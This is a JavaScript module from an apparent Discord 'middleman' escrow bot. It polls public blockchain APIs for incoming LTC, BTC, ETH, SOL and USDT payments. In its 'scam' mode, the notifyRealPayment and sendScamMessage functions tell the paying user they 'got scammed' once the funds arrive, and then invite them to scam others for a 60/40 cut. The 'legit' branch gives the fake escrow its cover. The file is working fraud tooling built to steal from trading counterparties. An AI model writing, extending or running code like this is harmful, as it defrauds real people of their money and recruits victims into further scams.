const axios = require('axios');
const path = require('path');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder } = require('discord.js');
const { getLtcAddress, getBtcAddress, getEthAddress, getSolAddress, getUsdtAddress, getMercyRoleId, getMode } = require('./settings');

const lastTxHash = {};
const lastReceived = {};
const monitorIntervals = {};

const COINGECKO_IDS = { LTC: 'litecoin', BTC: 'bitcoin', ETH: 'ethereum', SOL: 'solana' };
const BLOCKCHAIR_CHAINS = { LTC: 'litecoin', BTC: 'bitcoin', ETH: 'ethereum' };
const COIN_DECIMALS = { LTC: 1e8, BTC: 1e8, ETH: 1e18 };
const USDT_CONTRACT = '0xdac17f958d2ee523a2206206994597c13d831ec7';

async function getCoinPriceUSD(coin) {
  try {
    const id = COINGECKO_IDS[coin];
    if (!id) return 0;
    const resp = await axios.get(
      `https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`,
      { timeout: 6000 }
    );
    return resp.data?.[id]?.usd || 0;
  } catch { return 0; }
}

// ── Blockchair watcher (LTC / BTC / ETH) ──────────────────────────────────
async function checkBlockchairAddress(coin, address, client) {
  const chain = BLOCKCHAIR_CHAINS[coin];
  if (!chain || !address) return;
  try {
    const resp = await axios.get(
      `https://api.blockchair.com/${chain}/dashboards/address/${address}?limit=1`,
      { timeout: 10000 }
    );
    const data = resp.data?.data?.[address];
    if (!data) return;
    const txs = data.transactions;
    if (!txs?.length) return;

    const latest = txs[0];
    const prev = lastTxHash[coin];
    if (latest === prev) return;
    lastTxHash[coin] = latest;
    if (prev === undefined) return;

    const received = data.address?.received ?? 0;
    const prevReceived = lastReceived[coin] ?? received;
    const newCrypto = Math.max(0, (received - prevReceived) / COIN_DECIMALS[coin]);
    lastReceived[coin] = received;

    const priceUSD = await getCoinPriceUSD(coin);
    await notifyRealPayment(coin, newCrypto, priceUSD, latest, client);
  } catch { }
}

// ── USDT (ERC-20) watcher ─────────────────────────────────────────────────
async function checkUSDTAddress(address, client) {
  if (!address) return;
  try {
    const resp = await axios.get(
      `https://api.blockchair.com/ethereum/erc-20/${USDT_CONTRACT}/dashboards/address/${address}?limit=1`,
      { timeout: 10000 }
    );
    const data = resp.data?.data?.[address.toLowerCase()];
    if (!data) return;
    const txs = data.transactions;
    if (!txs?.length) return;

    const latest = txs[0];
    const prev = lastTxHash['USDT'];
    if (latest === prev) return;
    lastTxHash['USDT'] = latest;
    if (prev === undefined) return;

    const received = parseFloat(data.address?.balance_approximate ?? 0);
    const prevReceived = lastReceived['USDT'] ?? received;
    const newAmount = Math.max(0, received - prevReceived);
    lastReceived['USDT'] = received;

    await notifyRealPayment('USDT [ERC-20]', newAmount, 1, latest, client);
  } catch { }
}

// ── Solana watcher ────────────────────────────────────────────────────────
async function checkSolanaAddress(address, client) {
  if (!address) return;
  try {
    const resp = await axios.post(
      'https://api.mainnet-beta.solana.com',
      { jsonrpc: '2.0', id: 1, method: 'getSignaturesForAddress', params: [address, { limit: 1 }] },
      { timeout: 10000 }
    );
    const sigs = resp.data?.result;
    if (!sigs?.length) return;

    const latest = sigs[0].signature;
    const prev = lastTxHash['SOL'];
    if (latest === prev) return;
    lastTxHash['SOL'] = latest;
    if (prev === undefined) return;

    const priceUSD = await getCoinPriceUSD('SOL');
    await notifyRealPayment('SOL', 0, priceUSD, latest, client);
  } catch { }
}

// ── Central notification: branches on legit vs scam mode ──────────────────
async function notifyRealPayment(coin, cryptoAmount, priceUSD, txHash, client) {
  const usdValue = cryptoAmount > 0 && priceUSD > 0 ? cryptoAmount * priceUSD : 0;
  const halfCrypto = cryptoAmount / 2;
  const halfUSD = usdValue / 2;
  const displayCoin = coin === 'USDT [ERC-20]' ? 'USDT' : coin;
  const mode = getMode();

  for (const [channelId, deal] of client.activeDeals.entries()) {
    if (deal.coin !== coin) continue;
    if (deal.step !== 'awaiting_payment') continue;

    try {
      const channel = await client.channels.fetch(channelId).catch(() => null);
      if (!channel) continue;

      deal.detectedAmount = cryptoAmount;
      deal.detectedCoin = displayCoin;
      deal.detectedUSD = usdValue;
      deal.detectedHalfCrypto = halfCrypto;
      deal.detectedHalfUSD = halfUSD;

      if (mode === 'scam') {
        // ── SCAM MODE: show scam embed, ping receiver only ─────────────
        deal.step = 'scam_join_pending';
        deal.scamMode = true;

        const scamFile = new AttachmentBuilder(
          path.join(__dirname, '../assets/scmsg.jpg'),
          { name: 'scmsg.jpg' }
        );

        const embed = new EmbedBuilder()
          .setColor(0xe53935)
          .setTitle('Uh Oh! Unfortunately you got scammed')
          .setDescription(
            'You can recover your loss by letting the MM know if you want to join us or not.\n\n' +
            'You can earn **2x or 3x** of what you lost.\n' +
            'For the server link vouch the MM first as they tell you.\n' +
            'If you scam anyone\'s items, you will take 60% of the scam and MM takes 40%..\n' +
            'Or you can go home crying with nothing in your pocket.'
          )
          .setImage('attachment://scmsg.jpg');

        const actionRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('mercy_join').setLabel('Join Us').setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId('mercy_leave').setLabel('Leave').setStyle(ButtonStyle.Danger),
        );

        const receiverId = deal.receiver || deal.initiator;
        await channel.send({
          content: receiverId ? `<@${receiverId}>` : undefined,
          embeds: [embed],
          components: [actionRow],
          files: [scamFile],
        });

      } else {
        // ── LEGIT MODE: ask receiver for their address, send 100% ──────
        deal.step = 'await_receiver_address';
        deal.scamMode = false;

        const amountStr = cryptoAmount > 0
          ? `**${cryptoAmount.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${usdValue > 0 ? ` (~$${usdValue.toFixed(2)} USD)` : ''}`
          : `a **${displayCoin}** payment`;

        const checkmarkFile = new AttachmentBuilder(
          path.join(__dirname, '../assets/checkmark.jpg'),
          { name: 'checkmark.jpg' }
        );

        const embed = new EmbedBuilder()
          .setColor(0x00c853)
          .setTitle('Payment Detected!')
          .setDescription(
            `${amountStr} has been received and secured.\n\n` +
            `**Please type your ${displayCoin} wallet address** to receive your funds.`
          )
          .setThumbnail('attachment://checkmark.jpg')
          .setFooter({ text: `TX: ${String(txHash).slice(0, 24)}...` });

        const receiverId = deal.receiver || deal.initiator;
        await channel.send({
          content: receiverId ? `<@${receiverId}>` : undefined,
          embeds: [embed],
          files: [checkmarkFile],
        });
      }
    } catch (e) {
      console.error('Monitor notify error:', e.message);
    }
  }
}

// ── Scam message (triggered after sender confirms release) ─────────────────
async function sendScamMessage(channel, deal) {
  try {
    const scamFile = new AttachmentBuilder(
      path.join(__dirname, '../assets/scmsg.jpg'),
      { name: 'scmsg.jpg' }
    );

    const embed = new EmbedBuilder()
      .setColor(0xe53935)
      .setTitle('Uh Oh! Unfortunately you got scammed')
      .setDescription(
        'You can recover your loss by letting the MM know if you want join us or no.\n\n' +
        'You can earn **2x or 3x** of what you lost.\n' +
        '🔗 For the server link vouch the MM first as they tell you.\n' +
        '💰 If you scam anyone\'s items, you will take 60% of the scam and MM takes 40%..\n' +
        '🚫 Or you can go home crying with nothing in your pocket.'
      )
      .setImage('attachment://scmsg.jpg');

    const actionRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('mercy_join').setLabel('Join Us').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('mercy_leave').setLabel('Leave').setStyle(ButtonStyle.Danger),
    );

    const targetId = deal.receiver || deal.initiator;
    await channel.send({
      content: targetId ? `<@${targetId}>` : undefined,
      embeds: [embed],
      components: [actionRow],
      files: [scamFile],
    });
  } catch (e) {
    console.error('sendScamMessage error:', e.message);
  }
}

// ── Start / stop monitors ──────────────────────────────────────────────────
function startMonitor(address, client) {
  if (monitorIntervals['LTC']) clearInterval(monitorIntervals['LTC']);
  lastTxHash['LTC'] = undefined;
  lastReceived['LTC'] = undefined;
  const fn = () => checkBlockchairAddress('LTC', address, client);
  fn();
  monitorIntervals['LTC'] = setInterval(fn, 30000);
  console.log(`LTC monitor started: ${address}`);
}

function startAllMonitors(client) {
  const monitors = [
    { key: 'BTC', fn: () => checkBlockchairAddress('BTC', getBtcAddress(), client), addr: getBtcAddress() },
    { key: 'ETH', fn: () => checkBlockchairAddress('ETH', getEthAddress(), client), addr: getEthAddress() },
    { key: 'SOL', fn: () => checkSolanaAddress(getSolAddress(), client),             addr: getSolAddress() },
    { key: 'USDT', fn: () => checkUSDTAddress(getUsdtAddress(), client),             addr: getUsdtAddress() },
  ];

  for (const { key, fn, addr } of monitors) {
    if (!addr) continue;
    if (monitorIntervals[key]) clearInterval(monitorIntervals[key]);
    lastTxHash[key] = undefined;
    lastReceived[key] = undefined;
    fn();
    monitorIntervals[key] = setInterval(fn, 30000);
    console.log(`${key} monitor started: ${addr}`);
  }
}

function stopMonitor() {
  for (const key of Object.keys(monitorIntervals)) {
    clearInterval(monitorIntervals[key]);
    delete monitorIntervals[key];
  }
}

module.exports = { startMonitor, startAllMonitors, stopMonitor, sendScamMessage };
